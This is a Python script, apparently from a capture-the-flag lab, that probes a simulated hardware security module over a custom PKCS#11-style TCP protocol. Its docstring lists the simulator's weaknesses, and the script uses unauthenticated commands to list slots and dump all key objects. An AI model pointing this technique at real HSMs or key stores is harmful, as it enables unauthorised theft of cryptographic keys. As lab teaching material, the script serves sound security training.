#!/usr/bin/env python3
"""
pkcs11-probe.py — Educational PKCS#11 TCP probe for PMP CTF labs.

Sends a simplified PKCS#11-style binary command to the HSM TCP server
(port 5959) and displays the JSON response.

Usage:
    python3 pkcs11-probe.py [HOST] [PORT]

Defaults:
    HOST = 10.10.10.11  (hsm-simulator ctf-target-net IP)
    PORT = 5959

Wire format (binary):
    [4 bytes BE: function_code] [4 bytes BE: payload_length] [JSON payload]

Function codes:
    0x0001  C_GetSlotList  — List HSM slots (unauthenticated info leak)
    0x0003  C_OpenSession  — Open a session (returns sequential handle)
    0x0004  C_FindObjects  — Dump all key objects without authentication
    0x0005  C_Encrypt      — Encrypt data (ECB mode available)
    0x0006  C_GenerateKey  — Generate key (predictable sequential handle)

Payload fields (JSON):
    studentId  — Your student ID to receive a flag in the response
    keyLabel   — Key label for C_Encrypt (e.g. "DEK_AES_001")
    mode       — Encryption mode for C_Encrypt (e.g. "ECB" or "CBC")
    data       — Plaintext data for C_Encrypt
"""
import json
import os
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("PKCS_HOST", "10.10.10.11")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PKCS_PORT", "5959"))
STUDENT_ID = os.environ.get("STUDENT_ID", "")


def send_command(function_code: int, payload: dict) -> dict:
    """Send a PKCS#11 binary frame and return the parsed JSON response."""
    body = json.dumps(payload).encode("utf-8")
    header = struct.pack(">II", function_code, len(body))
    frame = header + body

    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.sendall(frame)

        # Read response header (8 bytes: function_code + payload_len)
        resp_header = b""
        while len(resp_header) < 8:
            chunk = sock.recv(8 - len(resp_header))
            if not chunk:
                break
            resp_header += chunk

        if len(resp_header) < 8:
            return {"error": "connection closed before response header"}

        _resp_fc, resp_len = struct.unpack(">II", resp_header)

        resp_body = b""
        while len(resp_body) < resp_len:
            chunk = sock.recv(resp_len - len(resp_body))
            if not chunk:
                break
            resp_body += chunk

    try:
        return json.loads(resp_body.decode("utf-8"))
    except json.JSONDecodeError:
        return {"raw": resp_body.decode("utf-8", errors="replace")}


def main() -> None:
    print(f"[*] Connecting to {HOST}:{PORT}")

    # C_GetSlotList (0x0001) — unauthenticated info leak
    print("\n[*] Sending C_GetSlotList (0x0001)")
    resp = send_command(0x0001, {"studentId": STUDENT_ID})
    print(json.dumps(resp, indent=2))

    if resp.get("flag"):
        print(f"\n[+] FLAG: {resp['flag']}")

    # C_FindObjects (0x0004) — dump all keys without authentication
    print("\n[*] Sending C_FindObjects (0x0004)")
    resp = send_command(0x0004, {"studentId": STUDENT_ID})
    print(json.dumps(resp, indent=2))


if __name__ == "__main__":
    main()
